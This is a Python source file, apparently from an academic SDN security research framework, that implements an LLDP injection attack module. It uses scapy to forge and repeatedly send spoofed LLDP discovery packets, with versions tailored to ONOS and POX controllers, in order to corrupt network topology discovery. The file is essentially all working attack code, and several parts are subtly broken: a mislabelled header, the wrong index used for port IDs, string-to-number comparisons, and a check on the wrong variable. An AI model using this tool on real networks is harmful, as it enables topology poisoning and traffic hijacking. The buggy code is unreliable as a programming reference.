#Samuel Jero <sjero@purdue.edu>
#Host ARP manipulation Module
import threading
import time
from lldp_layer import *
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp
from module import Module

class LLDPInjectThread(threading.Thread):
    def __init__(self,pkt,start,freq,num,iface):
        threading.Thread.__init__(self)
        self.pkt = pkt
        self.start_time = start
        self.freq = freq
        self.num = num
        self.iface = iface
        self.running = True

    def run(self):
        if self.start_time is not None:
            sl = time.time() - self.start_time
            time.sleep(sl)

        while self.running:
            if self.num == 0:
                break
            self.num-=1

            try:
                sendp(self.pkt,iface=self.iface,verbose=False)
            except Exception as e:
                print str(e)

            time.sleep(self.freq)
        return 0

    def quit(self):
        self.running = False
            

class LLDPAttack(Module):
    def __init__(self,myeth,myip,myif):
        self.name = "LLDP"
        self.ip = myip
        self.eth = myeth
        self.iface = myif
        self.threads = []

    def cmd(self,cmd):
        #Sanity checks
        if not isinstance(cmd,dict):
            return False, "Not dict"
        if not 'module' in cmd:
            return False, "no module member"
        if cmd['module'] is not "lldp":
            return False, "not lldp module!"
        if not 'command' in cmd:
            return False, "no command member"

        #Parse command
        if 'inject' in cmd['command']:
            return self.inject(cmd)
        elif 'stop' in cmd['command']:
            self.stop()
            return True, "Sucess"
        else:
            return False, "Invalid Command"

    def inject(self, cmd):
        start = None
        freq = 0
        num = -1
        ids = []
        ptype = ""

        if 'freq' in cmd:
            freq = cmd['freq']
        else:
            num = 1
        if 'num' in cmd:
            num = cmd['num']
        if 'start' in cmd:
            start = cmd['start']
        if 'num' == 1:
            freq = 0
        if 'freq' == 0:
            num = 1
        if 'ids' in cmd:
            ids = cmd['ids']
        if not isinstance(ids,(list,tuple)) or len(ids) < 4:
            return False, "Invalid IDs"
        if 'type' in cmd:
            ptype = cmd['type']

        try:
            if ptype == "onos":
                pkt = self._build_pkt_onos(ids)
            elif ptype == "pox":
                pkt = self._build_pkt_pox(ids)
            else:
                pkt = self._build_pkt_gen(ids)
        except Exception as e:
            return False, str(e)

        if pkt == None:
            return False, "Bad ID"

        th = LLDPInjectThread(pkt,start,freq,num,self.iface)
        th.daemon = True
        self.threads.append(th)
        th.start()
        return True,"Injection Sucess"

    def _build_pkt_gen(self, ids):
        pkt = Ether()/LLDP()
        if ids[0] is not None:
            pkt[Ether].dst = ids[0]
        else:
            pkt[Ether].dst = "01:23:20:00:00:01" #Nicira Discovery Multicast
        if ids[1] is not None:
            pkt[Ether].src = ids[1]
        else:
            pkt[Ether].src = "DE:AD:BE:EF:BA:11"
        chassisid = LLDPChassisId()
        if ids[2] is not None:
            chassisid.macaddr = ids[2]
        else:
            chassisid.macaddr = self.eth
        pkt[LLDP].tlvlist.append(chassisid)
        portid = LLDPPortId()
        portid.subtype = 2
        if ids[3] is not None:
            portid.value = ids[2]
        else:
            portid.value = "\0"
        pkt[LLDP].tlvlist.append(portid)
        ttl = LLDPTTL()
        pkt[LLDP].tlvlist.append(ttl)
        for i in range(4,len(ids)):
            val = ids[i]
            if not isinstance(id,(list,tuple)) or len(val) < 2:
                return None
            if val[0] != 127:
                #Normal TLV
                tlv = LLDPGeneric()
                tlv.type = val[0]
                tlv.value = val[1]
            else:
                #OrgSpecific TLV
                if len(val) < 4:
                    return None
                tlv = LLDPOrgSpecGeneric()
                tlv.type = val[0]
                tlv.oui = val[1]
                tlv.subtype = val[2]
                tlv.value = val[3]
            pkt[LLDP].tlvlist.append(tlv)
        end = LLDPDUEnd()
        pkt[LLDP].tlvlist.append(end)
        return pkt
    
    def _build_pkt_onos(self, ids):
        pkt = Ether()/LLDP()
        if ids[0] is not None:
            pkt[Ether].dst = ids[0]
        else:
            pkt[Ether].dst = "01:23:20:00:00:01" #Nicira Discovery Multicast
        if ids[1] is not None:
            pkt[Ether].src = ids[1]
        else:
            pkt[Ether].src = "DE:AD:BE:EF:BA:11"
        chassisid = LLDPChassisId()
        if ids[2] is not None:
            chassisid.macaddr = ids[2]
        else:
            chassisid.macaddr = self.eth
        pkt[LLDP].tlvlist.append(chassisid)
        portid = LLDPPortId()
        portid.subtype = 2
        if ids[3] is not None:
            portid.value = ids[2]
        else:
            portid.value = "\0"
        pkt[LLDP].tlvlist.append(portid)
        ttl = LLDPTTL()
        pkt[LLDP].tlvlist.append(ttl)
        #ONOS Name TLV
        tlv = LLDPOrgSpecGeneric()
        tlv.type = 127
        tlv.oui = 0xA42305
        tlv.subtype = 1
        tlv.value = "ONOS Discovery"
        pkt[LLDP].tlvlist.append(tlv)
        #ONOS Device TLV
        tlv = LLDPOrgSpecGeneric()
        tlv.type = 127
        tlv.oui = 0xA42305
        tlv.subtype = 2
        if ids[4] is not None:
            tlv.value = ids[4]
        else:
            tlv.value = "dpid:" + self.eth
        pkt[LLDP].tlvlist.append(tlv)
        end = LLDPDUEnd()
        pkt[LLDP].tlvlist.append(end)
        return pkt

    def _build_pkt_pox(self, ids):
        pkt = Ether()/LLDP()
        if ids[0] is not None:
            pkt[Ether].dst = ids[0]
        else:
            pkt[Ether].dst = "01:23:20:00:00:01" #Nicira Discovery Multicast
        if ids[1] is not None:
            pkt[Ether].src = ids[1]
        else:
            pkt[Ether].src = "DE:AD:BE:EF:BA:11"
        chassisid = LLDPChassisId()
        chassisid.subtype = "Locally assigned"
        if ids[2] is not None:
            chassisid.value = ids[2]
        else:
            chassisid.value = "dpid:" + self.eth
        pkt[LLDP].tlvlist.append(chassisid)
        portid = LLDPPortId()
        portid.subtype = 2
        if ids[3] is not None:
            portid.value = str(ids[2])
        else:
            portid.value = "0"
        pkt[LLDP].tlvlist.append(portid)
        ttl = LLDPTTL()
        pkt[LLDP].tlvlist.append(ttl)
        #POX System Description
        tlv = LLDPSystemDescription()
        if ids[4] is not None:
            tlv.value = "dpid:" + ids[4]
        else:
            tlv.value = "dpid:" + self.eth
        pkt[LLDP].tlvlist.append(tlv)
        end = LLDPDUEnd()
        pkt[LLDP].tlvlist.append(end)
        return pkt

    def start(self):
        return

    def stop(self):
        for th in self.threads:
            th.quit()
        return
